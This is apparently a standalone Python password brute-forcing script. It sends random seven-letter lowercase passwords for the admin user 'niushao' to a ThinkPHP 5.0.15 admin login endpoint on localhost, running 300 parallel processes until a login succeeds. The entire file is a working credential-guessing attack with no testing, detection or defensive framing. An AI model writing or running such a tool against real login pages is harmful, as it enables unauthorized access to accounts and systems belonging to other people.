import requests,json,random,string
from multiprocessing import Process,Pool
import os

def testPwd(url,data):
    resObj = requests.post(url,data)
    res = json.loads(resObj.text)
    return res

def getRand():
    #random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789')
    #int = random.randint(6,6)
    pwd = ""
    for x in range(7):
        str = random.choice('abcdefghijklmnopqrstuvwxyz')
        pwd = pwd+str
    return pwd

def execs():
    url = 'http://127.0.0.1:18080/DH_TuoLing/ThinkPHP5_5.0.15_old/public/index.php/admin/login/login_check'
    # data = {
    #     'admin_name':'niushao',
    #     'admin_password':getRand()
    # }
    # res = testPwd(url,data)
    # print(res)
    a = 1
    while a:
        pwd = getRand()
        data = {
            'admin_name':'niushao',
            'admin_password':pwd
        }
        res = testPwd(url,data)
        if res['code'] == 0:
            a = 0;
        else:
            print(pwd)



if __name__ == '__main__':
    p = Pool(300)
    for i in range(300):
        p.apply_async(execs,args=())
    p.close()
    p.join()
# url = 'http://127.0.0.1:18080/DH_TuoLing/ThinkPHP5_5.0.15_old/public/index.php/admin/login/login_check'
# data = {
#     'admin_name':'niushao',
#     'admin_password':getRand()
# }
#
#
# res = testPwd(url,data)
# print(res)